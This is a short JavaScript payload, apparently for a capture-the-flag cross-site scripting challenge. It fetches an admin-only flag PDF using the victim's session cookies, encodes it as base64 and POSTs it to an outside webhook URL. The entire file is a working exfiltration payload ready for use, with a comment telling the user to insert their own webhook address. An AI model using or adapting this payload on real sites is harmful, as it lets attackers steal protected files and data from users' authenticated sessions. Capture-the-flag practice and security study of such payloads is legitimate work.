(function(){
    // URL for the admin-only flag PDF
    const flagUrl = '/app/admin/flag.pdf';
    // Replace with your actual webhook URL
    const webhookUrl = 'https://test.github.io/cve';

    // Fetch the PDF with admin credentials
    fetch(flagUrl, { credentials: 'include' })
      .then(response => response.blob())
      .then(blob => {
          // Convert the PDF blob to a base64 string
          const reader = new FileReader();
          reader.onloadend = function() {
              const pdfData = reader.result; // Data URL string (base64 encoded)
              // Send the PDF data to your webhook
              fetch(webhookUrl, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ pdf: pdfData })
              });
          };
          reader.readAsDataURL(blob);
      })
      .catch(console.error);
})();
